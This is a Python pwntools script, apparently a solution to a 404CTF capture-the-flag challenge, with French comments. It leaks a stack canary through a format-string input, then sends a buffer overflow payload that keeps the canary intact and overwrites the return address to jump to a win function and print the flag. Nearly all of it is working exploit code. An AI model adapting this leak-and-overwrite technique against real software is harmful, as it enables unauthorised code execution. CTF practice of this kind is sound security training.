from pwn import remote, p64


def recv_choice():
    global p
    data = p.recvuntil(b">>> ")
    print(data.decode())


def recv_choice_1():
    global p
    data = p.recvuntil(b"[Vous] : ")
    print(data.decode())


def leak_canary():
    global p
    p.sendline(b"2")

    canary_leak = "%17$p"
    p.sendline(canary_leak.encode())
    p.recvuntil(b"[Vous] : ")
    canary = p.recvline().rstrip()
    return int(canary.decode()[2:], 16)


HOST = "challenges.404ctf.fr"
PORT = 30223
p = remote(HOST, PORT)
# p = process("./la_cohue")
win_addr = 0x400877  # <- Adresse de canary() qui retrouve le flag

recv_choice()
# Find canary
canary = leak_canary()
print("Canary: ", hex(canary))


recv_choice()
# Overflow
p.sendline(b"1")
recv_choice_1()
payload = b"A"*0x48 + p64(canary) + b"A"*8 + p64(win_addr)  # On écrit à rbp-0x50 et le canari est à rbp-0x8
# On ecrit donc 0x48 junk puis le canary pour ne pas overwrite le canary puis on overwrite rbp et enfin on met l'adresse de la
# fonction à la place de la return address
print(payload)
p.sendline(payload)

# Get flag
recv_choice()
p.sendline(b"3")
flag = p.recvuntil(b"}")
print(flag)
